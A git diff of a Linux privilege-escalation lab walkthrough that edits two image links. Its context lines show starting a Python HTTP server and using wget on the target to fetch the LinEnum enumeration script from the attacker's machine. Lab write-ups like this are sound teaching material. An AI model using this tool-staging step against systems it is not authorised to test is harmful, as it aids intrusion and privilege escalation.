@@ -8,7 +8,7 @@ Tasks **1**, **2**, and **3** don't need explanation.
 
 To get LinEnum on the target's machine, you need to start a server on your local machine (it has to be in the directory where you store LinEnum.sh or you will have to provide the path to it afterwards) and connect to it from the target :
 
-![Python Listener](https://raw.githubusercontent.com/peixetlift/peixetlift.github.io/master/assets/LinuxPrivEsc/python%20listener%20server4.png)
+![](https://raw.githubusercontent.com/peixetlift/peixetlift.github.io/master/assets/LinuxPrivEsc/python%20listener%20server4.png)
 
 ```
 python3 -m http.server 8000
@@ -20,7 +20,7 @@ python3 -m http.server 8000
 Once the server is started, you can request the file you want from the target's console :
 
 
-![wget LinEnum](https://github.com/peixetlift/peixetlift.github.io/blob/master/assets/LinuxPrivEsc/wget%20linenum4.png)
+![](https://raw.githubusercontent.com/peixetlift/peixetlift.github.io/master/assets/LinuxPrivEsc/wget%20linenum4.png)
 
 ```
 wget <YOUR MACHINE'S @IP>:8000/LinEnum.sh
